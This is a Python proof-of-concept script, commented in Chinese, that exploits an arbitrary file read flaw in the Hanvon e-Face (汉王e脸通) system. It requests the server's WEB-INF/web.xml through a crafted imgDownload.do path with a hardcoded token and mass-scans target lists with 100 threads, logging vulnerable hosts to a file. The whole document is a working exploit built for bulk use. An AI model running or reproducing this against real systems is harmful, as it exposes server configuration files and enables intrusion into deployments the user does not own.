#icon_hash="1380907357"
import requests,argparse,sys,urllib3,warnings
from multiprocessing.dummy import Pool
from colorama import Fore
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def main():
    parse = argparse.ArgumentParser(description='汉王e脸通任意文件读取')
    parse.add_argument('-u','--url',dest='url',type=str,help='inout url')
    parse.add_argument('-f','--file',dest='file',type=str,help='input file')
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f'Useage python {sys.argv[0]} -h')
def poc(target):
    link = '/manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Accept-Encoding': 'gzip'
    }
    try:
        res1 = requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link,headers=headers,timeout=5,verify=False)
            if '<!-- spring配置文件 -->' in res2.text:
                print(Fore.RED + f'[+]{target}存在任意文件读取漏洞' + Fore.RESET)
                with open('result.txt','a',encoding='utf-8') as a:
                    a.write(f'[+]{target}存在任意文件读取漏洞\n')
            else:
                print(f'[-]{target}不存在漏洞')
        else:
                print(f'[-]{target}不存在漏洞')
    except:
        print(f'[!]{target}存在问题，请手动测试')
if __name__ == '__main__':
    main()
